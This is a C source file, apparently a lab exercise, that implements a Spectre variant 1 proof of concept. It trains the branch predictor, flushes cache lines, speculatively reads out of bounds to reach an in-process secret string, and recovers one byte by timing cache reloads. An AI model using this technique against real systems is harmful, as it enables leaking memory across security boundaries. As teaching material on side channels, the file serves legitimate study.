#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define CACHE_HIT_THRESHOLD 200 // For Chuck

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char    *secret    = "Some Secret Value";

typedef struct datablock {
        uint8_t lpad[2048];   // Ensures dat is isolated
    uint8_t dat;
    uint8_t rpad[2047];  // Total size = 2048 + 1 + 2047 = 4096 bytes (1 page)

} DataBlock;

DataBlock array[256];


/**
 * Sandbox Function - Returns the value of the buffer if you are making a request within
 * its bounds, otherwise returns 0.
 */
uint8_t restrictedAccess(size_t x) {
        if (x <= bound_upper && x >= bound_lower) {
                return buffer[x];
        } else {
                return 0;
        }
}

void flushSideChannel() {
        for (int i = 0; i < 256; i++) {
                
                _mm_clflush(&array[i].dat);
        }

}

uint8_t reloadSideChannel() {
         int aux = 0;
        uint64_t timeElapse;
        int best_index = 0;
        uint64_t best_time = UINT64_MAX;

    for (int i = 255; i > -1; i--) {
        volatile uint8_t *add = &array[i].dat;
        
    uint64_t start = __rdtscp(&aux);
    aux = *add; // just to access the value of the data, to measure what is time needed to access it.
    uint64_t end = __rdtscp(&aux);
        timeElapse = end - start;
        if (timeElapse < best_time) {
           best_time = timeElapse;
           best_index = i;
        }
    }

    if (best_time <= CACHE_HIT_THRESHOLD) {
        return (uint8_t)best_index;
    } else {
        return 0xFF;
    }
}

/**
 * Abuse the spectre principle to steal a secret. After calling this
 * function, the cache should be setup in such a way that we can extract the
 * secret value, which is saved at the normally inaccessible location buffer[larger_x]
 */
void spectreAttack(size_t larger_x) {
        // TODO: Implement the attack
 uint8_t Secret;

    // Train the branch predictor
    for (int i = 0; i < 10; i++) {
        restrictedAccess(i);  // Always in bounds
    }

    // Flush boundary and array
    _mm_clflush(&bound_upper);  // Simulate delay in bound check
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i].dat);
    }

    //speculative access
    Secret  = restrictedAccess(larger_x);  // Out-of-bounds speculative read
    array[Secret].dat += 1;               // Encode secret into cache
}

int main() {
        // Ensure array is initialized => this can be added inside flushSideChannel
        for (int i = 0; i < 256; i++) {
        array[i].dat = 1;
        }

        flushSideChannel();
        size_t index_beyond = (size_t) ((size_t) secret - (size_t) buffer);
        fprintf(stderr, "Targeting address %p at offset %zu", secret, index_beyond);
        spectreAttack(index_beyond);
        int secret_byte = reloadSideChannel();

        printf("The secret is %d (%c).\n", secret_byte, secret_byte);

        return 0;
}